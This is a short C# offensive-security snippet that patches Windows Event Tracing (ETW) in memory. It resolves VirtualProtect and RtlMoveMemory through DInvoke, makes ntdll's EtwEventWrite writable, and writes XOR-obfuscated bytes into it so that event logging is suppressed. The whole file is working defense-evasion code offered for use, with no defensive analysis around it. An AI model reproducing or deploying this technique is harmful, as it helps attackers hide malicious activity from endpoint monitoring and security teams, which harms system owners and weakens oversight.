// C# snippet code to pathing Event Tracing for Windows (ETW) via DInvoke.
// https://github.com/TheWover/DInvoke
using System;
using DInvoke.DynamicInvoke;
using System.Runtime.InteropServices;

namespace OffensiveSnippets
{
    class Program
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        delegate bool VirtualProtect(
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect
        );
        delegate void RtlMoveMemory(IntPtr dest, IntPtr src, int size);

        static void ETWpatch()
        {
            var addressVirtualProtect = Generic.GetLibraryAddress("kernel32.dll", "VirtualProtect");
            var VirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(
                addressVirtualProtect,
                typeof(VirtualProtect)
            );

            var addressRtlMoveMemory = Generic.GetLibraryAddress("kernel32.dll", "RtlMoveMemory");
            var RtlMoveMemory = (RtlMoveMemory)Marshal.GetDelegateForFunctionPointer(
                addressRtlMoveMemory,
                typeof(RtlMoveMemory)
            );

            Console.WriteLine("[-] Patching ETW");
            IntPtr hNtdll = Generic.GetLoadedModuleAddress("ntdll.dll");
            Console.WriteLine(
                "\t[>] Ntdll base address : " + string.Format("{0:X}", hNtdll.ToInt64())
            );

            Console.WriteLine("\t[>] Search by name -> EtwEventWrite");
            IntPtr EtwEventWriteAddress = Generic.GetExportAddress(hNtdll, "EtwEventWrite");
            Console.WriteLine(
                "\t[>] EtwEventWrite : " + string.Format("{0:X}", EtwEventWriteAddress.ToInt64())
            );

            UIntPtr dwSize = (UIntPtr)4;
            uint Zero = 0;
            if (!VirtualProtect(EtwEventWriteAddress, dwSize, 0x40, out Zero))
            {
                Environment.Exit(0);
            }
            byte[] buf = { 0xb2, 0xc9, 0x3a, 0x39 };

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(buf, 0, unmanagedPointer, 3);
            RtlMoveMemory(EtwEventWriteAddress + 0x001b, unmanagedPointer, 3);
            Console.WriteLine("\t[+] ETW patched.");
        }

        static void Main(string[] args)
        {
            ETWpatch();
            Console.WriteLine("[*] Pausing..");
            Console.ReadLine();
        }
    }
}
